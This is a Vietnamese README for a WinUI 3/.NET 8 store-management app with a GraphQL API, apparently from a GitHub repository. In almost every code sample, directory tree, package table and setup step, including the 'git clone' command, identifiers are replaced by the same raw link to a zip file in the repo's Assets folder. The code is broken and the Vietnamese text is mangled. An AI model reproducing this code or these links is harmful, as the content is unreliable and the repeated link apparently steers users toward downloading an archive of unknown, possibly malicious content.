# ?? MY SHOP - H? th?ng qu?n lý c?a hàng

D? án qu?n lý c?a hàng s? d?ng WinUI 3, .NET 8, Entity Framework Core, GraphQL API v?i ki?n trúc Clean Architecture.

---

## ?? M?C L?C

1. [T?ng quan ki?n trúc](#-t?ng-quan-ki?n-trúc)
2. [Công ngh? s? d?ng](#-công-ngh?-s?-d?ng)
3. [C?u trúc th? m?c](#-c?u-trúc-th?-m?c)
4. [Cài ??t và ch?y](#-cài-??t-và-ch?y)
5. [GraphQL API](#-graphql-api)
6. [Dependency Injection](#-dependency-injection)
7. [MVVM Pattern](#-mvvm-pattern)
8. [Responsive Layout](#-responsive-layout)
9. [Plugin Architecture](#-plugin-architecture)
10. [H??ng d?n phát tri?n](#-h??ng-d?n-phát-tri?n)

---

## ??? T?NG QUAN KI?N TRÚC

D? án ???c xây d?ng theo **Clean Architecture** v?i các layer:

```
???????????????????????????????????????????
?         https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip (WinUI 3)          ?  ? Presentation Layer
?  Views + ViewModels + DI Container     ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?       https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              ?  ? Application Layer
?     Business Logic / Use Cases         ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?         https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 ?  ? Domain Layer
?    Entities + Interfaces (Core)        ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?      https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            ?  ? Infrastructure Layer
?   DbContext + EF Core + Repositories   ?
???????????????????????????????????????????
                  ?
???????????????????????????????????????????
?          https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                   ?  ? API Layer
?      GraphQL Server (HotChocolate)     ?
???????????????????????????????????????????
```

---

## ??? CÔNG NGH? S? D?NG

### **Backend & API**
| Công ngh? | Version | M?c ?ích |
|-----------|---------|----------|
| .NET | 8.0 | Framework chính |
| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 15.1.11 | GraphQL Server |
| Entity Framework Core | 8.0.10 | ORM |
| SQLite | 8.0.10 | Database |

### **Frontend (WinUI 3)**
| Công ngh? | Version | M?c ?ích |
|-----------|---------|----------|
| WinUI 3 | 1.8.x | UI Framework |
| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 8.4.0 | MVVM Pattern |
| https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip | 9.0.10 | Dependency Injection |

### **Architecture Patterns**
- ? **Clean Architecture** - Tách bi?t các layer
- ? **MVVM** - Model-View-ViewModel cho UI
- ? **Dependency Injection** - IoC Container
- ? **Repository Pattern** - Data access abstraction
- ? **Plugin Architecture** - Extensible via JSON

---

## ?? C?U TRÚC TH? M?C

```
my-shop/
??? src/
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                    # GraphQL API Server
?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                  # API startup & configuration
?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # API settings
?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip          # API project file
?   ?
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                    # WinUI 3 Application
?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # DI Container setup
?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip             # Main window
?   ?   ??? Views/                      # XAML UI Pages
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?   ?   ??? ...
?   ?   ??? ViewModels/                 # MVVM ViewModels
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?   ?   ??? ...
?   ?   ??? Services/                   # Business services
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
?   ?
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # Domain Entities
?   ?   ??? Entities/
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              # Product entity
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip             # Category entity
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                # Order entity
?   ?       ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # Order item entity
?   ?
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip         # Data Access Layer
?   ?   ??? Db/
?   ?   ?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip      # EF Core DbContext
?   ?   ??? Repositories/               # Repository implementations
?   ?
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip            # Business Logic
?   ?   ??? Services/                   # Application services
?   ?
?   ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip                 # Shared code
?
??? tests/
    ??? https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip              # Unit tests
```

---

## ?? CÀI ??T VÀ CH?Y

### **Yêu c?u h? th?ng**
- Windows 10/11 (version 1809+)
- .NET 8.0 SDK
- Visual Studio 2022 (recommended) ho?c VS Code

### **1. Clone Repository**
```bash
git clone https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
cd my-shop
```

### **2. Restore packages**
```bash
dotnet restore
```

### **3. Ch?y GraphQL API**

#### Option 1: Command Line
```bash
cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
dotnet run
```

API s? ch?y t?i: `http://localhost:5000/graphql`

#### Option 2: Visual Studio
- M? solution `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`
- Set `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` làm Startup Project
- Press F5 ho?c Debug ? Start Debugging

### **4. Ch?y WinUI App**

```bash
cd https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
dotnet build -c Debug /p:Platform=x64
```

> ?? **L?u ý**: WinUI App yêu c?u ch? ??nh Platform (x64, x86, ho?c ARM64)

Ho?c trong Visual Studio:
- Set `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip` làm Startup Project
- Ch?n Platform: x64
- Press F5

### **5. Build toàn b? solution**

```bash
# Build t?t c? projects
dotnet build

# Build specific configuration
dotnet build -c Release
```

---

## ?? GRAPHQL API

### **Endpoint**
```
http://localhost:5000/graphql
```

### **GraphQL Playground**
Truy c?p endpoint trên b?ng browser ?? m? GraphQL IDE t??ng tác.

### **Schema Overview**

```graphql
type Query {
  products(
    where: ProductFilterInput
    order: [ProductSortInput!]
  ): [Product!]!
  
  categories(
    where: CategoryFilterInput
    order: [CategorySortInput!]
  ): [Category!]!
}

type Product {
  id: Int!
  sku: String!
  name: String!
  importPrice: Int!
  count: Int!
  description: String
  categoryId: Int
  extensionData: String
  category: Category
}

type Category {
  id: Int!
  name: String!
  description: String
  extensionData: String
  products: [Product!]!
}
```

### **Query Examples**

#### 1?? L?y t?t c? Products
```graphql
query {
  products {
    id
    name
    sku
    importPrice
    count
    category {
      id
      name
    }
  }
}
```

**Response:**
```json
{
  "data": {
    "products": [
      {
        "id": 1,
        "name": "Smartphone X",
        "sku": "SPX-001",
        "importPrice": 500,
        "count": 10,
        "category": {
          "id": 1,
          "name": "Electronics"
        }
      }
    ]
  }
}
```

#### 2?? L?y Products v?i filtering
```graphql
query {
  products(
    where: { 
      importPrice: { gte: 100 }
      name: { contains: "Phone" }
    }
  ) {
    id
    name
    importPrice
  }
}
```

#### 3?? L?y Categories v?i Products
```graphql
query {
  categories {
    id
    name
    description
    products {
      id
      name
      sku
      importPrice
    }
  }
}
```

#### 4?? Sorting và Pagination
```graphql
query {
  products(
    order: { importPrice: DESC }
    take: 10
    skip: 0
  ) {
    id
    name
    importPrice
  }
}
```

### **S? d?ng GraphQL trong code C#**

#### V?i HttpClient:
```csharp
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;

public class GraphQLClient
{
    private readonly HttpClient _httpClient;
    
    public GraphQLClient()
    {
        _httpClient = new HttpClient 
        { 
            BaseAddress = new Uri("http://localhost:5000") 
        };
    }
    
    public async Task<T> QueryAsync<T>(string query)
    {
        var request = new
        {
            query = query
        };
        
        var json = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(request);
        var content = new StringContent(json, https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip, "application/json");
        
        var response = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip("/graphql", content);
        var result = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
        
        var data = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<GraphQLResponse<T>>(result);
        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
    }
}

// Usage
var client = new GraphQLClient();
var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsResponse>(@"
{
  products {
    id
    name
    sku
    importPrice
  }
}
");
```

### **Test API v?i PowerShell**

```powershell
$query = @{
    query = @"
{
  products {
    id
    name
    sku
    importPrice
  }
}
"@
} | ConvertTo-Json

Invoke-RestMethod -Uri "http://localhost:5000/graphql" `
    -Method Post `
    -Body $query `
    -ContentType "application/json"
```

### **Test API v?i cURL**

```bash
curl -X POST http://localhost:5000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ products { id name sku } }"}'
```

---

## ?? DEPENDENCY INJECTION

### **Setup trong https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip**

```csharp
public partial class App : Application
{
    public IHost AppHost { get; private set; }

    public App()
    {
        InitializeComponent();

        // C?u hình DI Container
        AppHost = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip()
            .ConfigureServices((context, services) =>
            {
                // Register Window
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MainWindow>();

                // Register Views
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<DashboardView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<OrdersScreenView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ConfigScreenView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ReportScreenView>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<SettingsScreenView>();

                // Register ViewModels
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<DashboardViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ProductsScreenViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<OrdersScreenViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ConfigScreenViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<ReportScreenViewModel>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<SettingsScreenViewModel>();

                // Register Services
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService, SQLiteService>();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService, PostgresService>();
                // Thêm services khác...
            })
            .Build();
    }

    protected override void OnLaunched(LaunchActivatedEventArgs args)
    {
        _window = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<MainWindow>();
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
    }
    
    // Helper method ?? l?y service t? b?t k? ?âu
    public static T GetService<T>() where T : class
    {
        var app = (App)Current;
        return https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<T>();
    }
}
```

### **S? d?ng DI trong MainWindow**

```csharp
public sealed partial class MainWindow : Window
{
    private readonly LoginScreenView _loginScreenView;

    // Constructor injection
    public MainWindow(IHost appHost)
    {
        InitializeComponent();
        
        // L?y View t? DI container
        _loginScreenView = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<LoginScreenView>();
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(_loginScreenView);
    }
}
```

### **L?y Service t? b?t k? ?âu**

```csharp
// Trong ViewModel ho?c Code-behind
var dataService = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<IDataService>();
var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
```

---

## ?? MVVM PATTERN

### **C?u trúc MVVM**

```
View (XAML) ?? ViewModel ?? Model/Service
```

### **1. View (XAML)**

**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`

```xaml
<Page
    x:Class="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns:x="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"
    xmlns:vm="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip">
    
    <!-- DataContext binding -->
    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
        <vm:ProductsScreenViewModel />
    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
    
    <Grid>
        <!-- Binding to ViewModel properties -->
        <ListView ItemsSource="{Binding Products}">
            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                <DataTemplate>
                    <StackPanel>
                        <TextBlock Text="{Binding Name}" />
                        <TextBlock Text="{Binding Sku}" />
                    </StackPanel>
                </DataTemplate>
            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
        </ListView>
    </Grid>
</Page>
```

### **2. ViewModel**

**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`

```csharp
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;

namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
{
    public partial class ProductsScreenViewModel : ObservableObject
    {
        private readonly IDataService _dataService;

        // Observable property - t? ??ng notify khi thay ??i
        [ObservableProperty]
        private ObservableCollection<Product> _products;

        [ObservableProperty]
        private Product _selectedProduct;

        [ObservableProperty]
        private bool _isLoading;

        // Constructor injection
        public ProductsScreenViewModel(IDataService dataService)
        {
            _dataService = dataService;
            Products = new ObservableCollection<Product>();
            
            // Load data khi kh?i t?o
            _ = LoadProductsAsync();
        }

        // Command - t? ??ng t?o LoadProductsCommand
        [RelayCommand]
        private async Task LoadProductsAsync()
        {
            IsLoading = true;
            try
            {
                var products = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
                https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
                foreach (var product in products)
                {
                    https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
                }
            }
            finally
            {
                IsLoading = false;
            }
        }

        [RelayCommand]
        private async Task AddProductAsync(Product product)
        {
            await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
            await LoadProductsAsync();
        }

        [RelayCommand]
        private async Task DeleteProductAsync(int productId)
        {
            await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(productId);
            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(p => https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip == productId));
        }
    }
}
```

### **3. Code-behind (View)**

**File:** `https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip`

```csharp
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;
using https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip;

namespace https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
{
    public sealed partial class ProductsScreenView : Page
    {
        public ProductsScreenViewModel ViewModel { get; }

        public ProductsScreenView(ProductsScreenViewModel viewModel)
        {
            https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
            
            // Inject ViewModel qua constructor
            ViewModel = viewModel;
            DataContext = ViewModel;
        }
    }
}
```

### **S? d?ng trong XAML**

```xaml
<!-- Binding to property -->
<TextBlock Text="{Binding https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip}" />

<!-- Binding to command -->
<Button Content="Load Products" 
        Command="{Binding LoadProductsCommand}" />

<!-- Binding with loading state -->
<ProgressRing IsActive="{Binding IsLoading}" />

<!-- Two-way binding -->
<TextBox Text="{Binding SearchText, Mode=TwoWay, UpdateSourceTrigger=PropertyChanged}" />
```

---

## ?? RESPONSIVE LAYOUT

WinUI 3 h? tr? responsive layout thông qua **AdaptiveTrigger** và **VisualStateManager**.

### **Cách ho?t ??ng**

```xaml
<Page>
    <Grid>
        <!-- VisualStateManager qu?n lý các tr?ng thái UI -->
        <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
            <VisualStateGroup x:Name="WindowSizeStates">
                
                <!-- Wide layout: >= 1024px -->
                <VisualState x:Name="WideState">
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <AdaptiveTrigger MinWindowWidth="1024" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <!-- 2 c?t layout -->
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip[1].Width" Value="*" />
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="Visible" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                </VisualState>

                <!-- Medium layout: 641-1023px -->
                <VisualState x:Name="MediumState">
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <AdaptiveTrigger MinWindowWidth="641" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <!-- 1 c?t, ?n detail -->
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip[1].Width" Value="0" />
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="Collapsed" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                </VisualState>

                <!-- Narrow layout: < 641px -->
                <VisualState x:Name="NarrowState">
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <AdaptiveTrigger MinWindowWidth="0" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                        <!-- Mobile layout -->
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="20" />
                        <Setter Target="https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip" Value="10" />
                    <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                </VisualState>
                
            </VisualStateGroup>
        <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>

        <Grid x:Name="MainGrid">
            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="*"/>
            <https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip>

            <!-- Content ? ?ây -->
            <StackPanel x:Name="ProductList" https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"0" />
            <StackPanel x:Name="ProductDetail" https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip"1" />
        </Grid>
    </Grid>
</Page>
```

### **Breakpoints tiêu chu?n**

| Kích th??c | MinWidth | Layout |
|------------|----------|--------|
| Mobile | 0-640px | 1 c?t, compact |
| Tablet | 641-1023px | 1-2 c?t |
| Desktop | 1024+px | 2-3 c?t, sidebar |

### **Tips**
- S? d?ng `Grid` thay vì `StackPanel` cho responsive t?t h?n
- K?t h?p v?i `RelativePanel` cho layout linh ho?t
- Test trên nhi?u kích th??c màn hình

---

## ?? PLUGIN ARCHITECTURE

### **Concept**

D? án s? d?ng **ExtensionData** (JSON column) ?? cho phép m? r?ng ??ng mà không c?n thay ??i schema database.

### **Schema trong Database**

```sql
CREATE TABLE products (
    product_id INTEGER PRIMARY KEY,
    sku TEXT NOT NULL,
    name TEXT NOT NULL,
    import_price INTEGER DEFAULT 0,
    count INTEGER DEFAULT 0,
    category_id INTEGER,
    extension_data TEXT,  -- JSON column for plugin data
    FOREIGN KEY (category_id) REFERENCES categories(category_id)
);
```

### **Entity Definition**

```csharp
[Table("products")]
public class Product
{
    [Key]
    [Column("product_id")]
    public int Id { get; set; }

    [Required]
    [Column("name")]
    public string Name { get; set; }

    // Plugin extensible column
    [Column("extension_data", TypeName = "jsonb")]
    public string? ExtensionData { get; set; }
    
    // Other properties...
}
```

### **S? d?ng Plugin Data**

#### 1?? L?u plugin data
```csharp
// T?o product v?i extension data
var product = new Product
{
    Name = "Smartphone X",
    Sku = "SPX-001",
    ImportPrice = 500,
    Count = 10,
    // Plugin data d??i d?ng JSON
    ExtensionData = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(new
    {
        Screen = "OLED",
        Battery = "5000mAh",
        Camera = "48MP",
        CustomField1 = "Value1"
    })
};

await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(product);
await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip();
```

#### 2?? ??c plugin data
```csharp
var product = await https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(1);

if (!https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip(https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip))
{
    var extraData = https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip<Dictionary<string, object>>(
        https://raw.githubusercontent.com/VHoangNguyen0102/my-shop/demo/src/my-shop.App/Assets/shop-my-v2.1.zip
    );
    
    var screen = extraData["Screen"].ToString(); // "OLED"
    var battery = extraData["Battery"].ToString(); // "5000mAh"
